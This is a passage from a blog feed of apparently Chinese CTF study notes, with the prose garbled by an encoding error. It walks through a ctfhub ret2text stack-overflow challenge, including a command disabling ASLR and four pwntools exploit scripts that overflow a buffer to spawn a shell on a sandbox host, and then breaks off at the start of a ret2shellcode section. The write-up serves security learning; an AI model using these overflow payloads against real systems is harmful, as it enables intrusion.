ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹Linuxç¯‡ - å­¦ä¹ ç¬”è®°-level5-é€šç”¨gadget</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfé¢˜ç›®ç³»åˆ—ã€‘è‡ªå®šä¹‰</title>
    <link href="/2023/08/21/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91%E8%87%AA%E5%AE%9A%E4%B9%89/"/>
    <url>/2023/08/21/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91%E8%87%AA%E5%AE%9A%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc -m32 -fno-stack-protector stack_example.c -o stack_example<br></code></pre></td></tr></table></figure><p><code>-m32</code>Â æŒ‡çš„æ˜¯ç”Ÿæˆ 32 ä½ç¨‹åºï¼›Â <code>-fno-stack-protector</code>Â æŒ‡çš„æ˜¯ä¸å¼€å¯å †æ ˆæº¢å‡ºä¿æŠ¤ï¼Œå³ä¸ç”Ÿæˆ canaryã€‚<br>å¦‚æœå«æœ‰<code>--enable-default-pie</code>å‚æ•°åˆ™ä»£è¡¨ PIE é»˜è®¤å·²å¼€å¯ï¼Œéœ€è¦åœ¨ç¼–è¯‘æŒ‡ä»¤ä¸­æ·»åŠ å‚æ•°<code>-no-pie</code>ã€‚<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>å…³é—­ Linux ç³»ç»Ÿçš„ ASLR</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfé¢˜ç›®ç³»åˆ—ã€‘ctfhub pwnç±»å‹</title>
    <link href="/2023/08/21/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfhub%20pwn%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/08/21/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfhub%20pwn%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>ret2texté¡¾åæ€ä¹‰ï¼Œå³æ§åˆ¶è¿”å›åœ°å€æŒ‡å‘ç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç (.text)å¹¶æ‰§è¡Œã€‚</p><h2 id="checksecæ£€æŸ¥"><a href="#checksecæ£€æŸ¥" class="headerlink" title="checksecæ£€æŸ¥"></a>checksecæ£€æŸ¥</h2><p>æ£€æŸ¥äºŒè¿›åˆ¶ï¼š64ä½äºŒè¿›åˆ¶ï¼Œæœ‰å¯æ‰§è¡Œæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ctfhub]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfhub/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x400000)<br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></table></figure><h2 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><p>mainå‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">112</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-70h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to CTFHub ret2text.Input someting:&quot;</span>);<br>  gets(v4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bye&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªsecureå‡½æ•°ï¼Œé‡Œé¢æœ‰<code>system(&#39;/bin/sh&#39;)</code>ï¼Œéœ€è¦æ‰¾åˆ° <code>system(&#39;/bin/sh&#39;)</code>å‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è·å–shell</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821112909.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">secure</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v0 = time(<span class="hljs-number">0LL</span>);<br>  srand(v0);<br>  v3 = rand();<br>  __isoc99_scanf(&amp;unk_4008C8, &amp;v2);<br>  result = v2;<br>  <span class="hljs-keyword">if</span> ( v3 == v2 )<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨system(â€œ&#x2F;bin&#x2F;shâ€);åé¢æ‘tab</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821113201.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821142044.png" alt="image.png"></p><p>ç”¨åæ±‡ç¼–ï¼Œè·å–åˆ°systemå‡½æ•°çš„åœ°å€ã€‚ç”±äºè¦å®Œæ•´è°ƒç”¨ï¼Œæ‰€ä»¥å–leaæŒ‡ä»¤çš„ä½ç½®ï¼š<code>0x00000000004007b8</code>ï¼Œä¹Ÿå°±æ˜¯<code>0x4007b8</code><br>&#x2F;bin&#x2F;shçš„åœ°å€ä¸ºï¼š0x4008CB</p><h2 id="ï¼ï¼ï¼é‡ç‚¹ï¼ï¼ï¼"><a href="#ï¼ï¼ï¼é‡ç‚¹ï¼ï¼ï¼" class="headerlink" title="ï¼ï¼ï¼é‡ç‚¹ï¼ï¼ï¼"></a>ï¼ï¼ï¼é‡ç‚¹ï¼ï¼ï¼</h2><p>æ­¤å¤„ï¼Œæ‹¿çš„æ˜¯leaæŒ‡ä»¤çš„ä½ç½®</p><h2 id="gdbåˆ†æå‡½æ•°åœ°å€"><a href="#gdbåˆ†æå‡½æ•°åœ°å€" class="headerlink" title="gdbåˆ†æå‡½æ•°åœ°å€"></a>gdbåˆ†æå‡½æ•°åœ°å€</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; disassemble secure<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> secure:<br>   0x0000000000400777 &lt;+0&gt;:     push   rbp<br>   0x0000000000400778 &lt;+1&gt;:     mov    rbp,rsp<br>   0x000000000040077b &lt;+4&gt;:     sub    rsp,0x10<br>   0x000000000040077f &lt;+8&gt;:     mov    edi,0x0<br>   0x0000000000400784 &lt;+13&gt;:    call   0x400640 &lt;time@plt&gt;<br>   0x0000000000400789 &lt;+18&gt;:    mov    edi,eax<br>   0x000000000040078b &lt;+20&gt;:    call   0x400630 &lt;srand@plt&gt;<br>   0x0000000000400790 &lt;+25&gt;:    call   0x400680 &lt;rand@plt&gt;<br>   0x0000000000400795 &lt;+30&gt;:    mov    DWORD PTR [rbp-0x4],eax<br>   0x0000000000400798 &lt;+33&gt;:    lea    rax,[rbp-0x8]<br>   0x000000000040079c &lt;+37&gt;:    mov    rsi,rax<br>   0x000000000040079f &lt;+40&gt;:    lea    rdi,[rip+0x122]        <span class="hljs-comment"># 0x4008c8</span><br>   0x00000000004007a6 &lt;+47&gt;:    mov    eax,0x0<br>   0x00000000004007ab &lt;+52&gt;:    call   0x400670 &lt;__isoc99_scanf@plt&gt;<br>   0x00000000004007b0 &lt;+57&gt;:    mov    eax,DWORD PTR [rbp-0x8]<br>   0x00000000004007b3 &lt;+60&gt;:    cmp    DWORD PTR [rbp-0x4],eax<br>   0x00000000004007b6 &lt;+63&gt;:    jne    0x4007c4 &lt;secure+77&gt;<br>   0x00000000004007b8 &lt;+65&gt;:    lea    rdi,[rip+0x10c]        <span class="hljs-comment"># 0x4008cb</span><br>   0x00000000004007bf &lt;+72&gt;:    call   0x400620 &lt;system@plt&gt;<br>   0x00000000004007c4 &lt;+77&gt;:    nop<br>   0x00000000004007c5 &lt;+78&gt;:    leave<br>   0x00000000004007c6 &lt;+79&gt;:    ret<br>End of assembler dump.<br><br></code></pre></td></tr></table></figure><p>å†ç”¨åæ±‡ç¼–æŸ¥çœ‹secureå‡½æ•°çš„ä»£ç ï¼Œç¡®å®šsystem(â€œ&#x2F;bin&#x2F;shâ€)çš„åœ°å€ä¸º<code>0x00000000004007b8</code>ï¼Œå³<code>0x4007b8</code></p><h2 id="gdbåˆ†æåç§»"><a href="#gdbåˆ†æåç§»" class="headerlink" title="gdbåˆ†æåç§»"></a>gdbåˆ†æåç§»</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">b main<br>run<br>n<br>n<br><br></code></pre></td></tr></table></figure><p>è¾“å…¥ä¸€ä¸²æŒ‡ä»¤â€œAAAAAAAAâ€ï¼ŒæŸ¥çœ‹stackï¼Œæ‰¾åˆ°å˜é‡å’Œrbpçš„è·ç¦»</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821113407.png" alt="image.png"></p><p>ç”±äºrbpæŒ‡å‘çš„æ˜¯old rbpï¼Œæ‰€ä»¥è¿˜éœ€è¦åŠ ä¸Š8å­—èŠ‚çš„å¡«å……</p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>å­˜åœ¨åé—¨å‡½æ•°ï¼Œç›´æ¥æŠŠè¿”å›åœ°å€å¡«å†™ä¸ºåé—¨å‡½æ•°çš„åœ°å€å³å¯</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">é»˜è®¤æ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br><br>ä¿®æ”¹åæ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    (retaddr)    </span>|<br>                                           |<span class="hljs-string">   åé—¨å‡½æ•°_addr  </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">     BBBBBBBBB   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">   AAA...AAAA    </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                     v4---&gt;+-----------------+<br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;challenge-1ca238f0d4e5a4be.sandbox.ctfhub.com&quot;</span>, <span class="hljs-number">28062</span>)  <br> <br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>return_addr = <span class="hljs-number">0x4007b8</span><br>payload = padding + p64(return_addr)<br><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>host=<span class="hljs-string">&#x27;challenge-1ca238f0d4e5a4be.sandbox.ctfhub.com&#x27;</span><br>port=<span class="hljs-number">28062</span><br>io=connect(host,port)<br><br>padding = <span class="hljs-number">0x78</span> <span class="hljs-comment"># 16*7=112</span><br>return_addr = <span class="hljs-number">0x4007b8</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*padding,return_addr])<br><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>host = <span class="hljs-string">&#x27;challenge-1ca238f0d4e5a4be.sandbox.ctfhub.com&#x27;</span><br>port = <span class="hljs-number">28062</span><br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = connect(host, port)<br><br>padding = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">&#x27;A&#x27;</span>,encoding=<span class="hljs-string">&quot;utf8&quot;</span>) * <span class="hljs-number">0x78</span><br>return_addr = <span class="hljs-number">0x4007b8</span><br>payload = padding + p64(return_addr)<span class="hljs-comment">#ç±»å‹ä¸åŒä¸èƒ½æ‹¼æ¥</span><br><br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="exp4"><a href="#exp4" class="headerlink" title="exp4"></a>exp4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;challenge-1ca238f0d4e5a4be.sandbox.ctfhub.com&quot;</span>, <span class="hljs-number">28062</span>)  <br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>return_addr = <span class="hljs-number">0x4007b8</span><br>payload = padding + p64(return_addr)<br><br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="æœ€ç»ˆç»“æœ"><a href="#æœ€ç»ˆç»“æœ" class="headerlink" title="æœ€ç»ˆç»“æœ"></a>æœ€ç»ˆç»“æœ</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821113526.png" alt="image.png"></p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="æ±‡ç¼–è¯­è¨€ä¸­movå’Œleaçš„åŒºåˆ«"><a href="#æ±‡ç¼–è¯­è¨€ä¸­movå’Œleaçš„åŒºåˆ«" class="headerlink" title="æ±‡ç¼–è¯­è¨€ä¸­movå’Œleaçš„åŒºåˆ«"></a>æ±‡ç¼–è¯­è¨€ä¸­movå’Œleaçš„åŒºåˆ«</h3><p>leaæ˜¯â€œload effective addressâ€çš„ç¼©å†™ï¼Œç®€å•çš„è¯´ï¼ŒleaæŒ‡ä»¤å¯ä»¥ç”¨æ¥å°†ä¸€ä¸ªå†…å­˜åœ°å€ç›´æ¥èµ‹ç»™ç›®çš„æ“ä½œæ•°ï¼Œä¾‹å¦‚ï¼š</p><p>lea eax,[ebx+8]å°±æ˜¯å°†ebx+8è¿™ä¸ªå€¼ç›´æ¥èµ‹ç»™eaxï¼Œè€Œä¸æ˜¯æŠŠebx+8å¤„çš„å†…å­˜åœ°å€é‡Œçš„æ•°æ®èµ‹ç»™eaxã€‚</p><p>è€ŒmovæŒ‡ä»¤åˆ™æ°æ°ç›¸åï¼Œä¾‹å¦‚ï¼š</p><p>mov eax,[ebx+8]åˆ™æ˜¯æŠŠå†…å­˜åœ°å€ä¸ºebx+8å¤„çš„æ•°æ®èµ‹ç»™eaxã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/weixin_47565708/article/details/109748747?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-109748747-blog-126544094.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-109748747-blog-126544094.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=2"># CTFhub æŠ€èƒ½æ ‘ PWN ret2text Python3 exp</a><br><a href="https://blog.csdn.net/m0_43405474/article/details/126544094"># CTFhub-pwn-[ret2text]-writeup</a><br><a href="https://writeup.ctfhub.com/Skill/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/ofBtUNidwfzzuXMBNBr4SF.html"># ctfhub å®˜æ–¹ ret2text</a><br><a href="https://www.zhihu.com/question/40720890"># æ±‡ç¼–è¯­è¨€ä¸­movå’Œleaçš„åŒºåˆ«æœ‰å“ªäº›ï¼Ÿ</a></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2shellcode]<span class="hljs-comment"># ./pwn</span><br>Welcome to CTFHub ret2shellcode!<br>What is it : [0x7ffef2f86cb0] ?<br>Input someting :<br>1234qwer<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2shellcode]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfhub/ret2shellcode/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x400000)<br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></table></figure><h2 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __int64 buf[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to CTFHub ret2shellcode!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What is it : [%p] ?\n&quot;</span>, buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input someting : &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x400</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="gdbåˆ†æåç§»-1"><a href="#gdbåˆ†æåç§»-1" class="headerlink" title="gdbåˆ†æåç§»"></a>gdbåˆ†æåç§»</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821172447.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821164743.png" alt="image.png"></p><p>åœ¨ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œæ ˆæœ‰å¯æ‰§è¡Œæƒé™</p><p>å¯ä»¥æŠŠ shellcode æ”¾åœ¨è¿”å›åœ°å€ä¹‹åï¼Œç„¶åæŠŠè¿”å›åœ°å€æŒ‡å‘ shellcodeã€‚</p><h2 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>æ ˆå¯æ‰§è¡Œï¼ŒæŠŠshellcodeæ”¾åˆ°æ ˆä¸Šå°±å¯ä»¥</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">é»˜è®¤æ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                    buf---&gt;+-----------------+<br><br>ä¿®æ”¹åæ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">    shellcode    </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (retaddr)     </span>|<br>                                           |<span class="hljs-string"> shellcode_addr  </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">   (saved ebp)   </span>|<br>                                           |<span class="hljs-string">     BBBBBBBBB   </span>|<br>                                    ebp---&gt;+-----------------+<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">   AAA...AAAA    </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                    buf---&gt;+-----------------+<br></code></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><h3 id="exp1-1"><a href="#exp1-1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 